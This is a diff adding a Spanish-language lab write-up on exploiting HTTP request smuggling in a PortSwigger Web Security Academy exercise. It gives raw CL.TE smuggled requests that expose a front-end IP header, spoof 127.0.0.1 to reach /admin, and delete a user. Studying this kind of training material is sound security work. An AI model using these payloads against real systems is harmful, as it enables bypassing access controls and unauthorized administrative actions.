@@ -385,4 +385,74 @@ x=1
 Despues ya solo le eliminas notar como se cambio la peticion POST por GET.
 
 
+# Exploiting HTTP request smuggling to reveal front-end request rewriting
+
+> https://string-functions.com/length.aspx
+
+Primero para resolver este lab nos damos cuenta que el /admin dice que solo es accesible mediante 127.1 y al pasar varias peticiones nos damos cuenta que
+se agrega una cabecera que le dice al sitio que ip esta intentando acceder. se cambiar esa peticion post a get y se ve que si se alcanza el portal de /admin
+despues de va cambiando el tamaño de la peticion con la pagina de arriba. finalmente se elimina el usuario carlos con una peticion get.
+
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+```
+Se usa primero la segunda peticion de post porque la applicacion pasa los datos de search mediante post.
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+
+```
+
+Se hace uso de la cabecera para indicar la ip esta se veia reflejada en la peticion post cuando se buscaba.
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+
+```
+Finalmente calculamos los nuevos valores de length y mandamos 2 veces dicha peticion y borramos a carlos y resolvemos el lab.
+
+
 > https://portswigger.net/web-security/request-smuggling
+>  https://string-functions.com/length.aspx
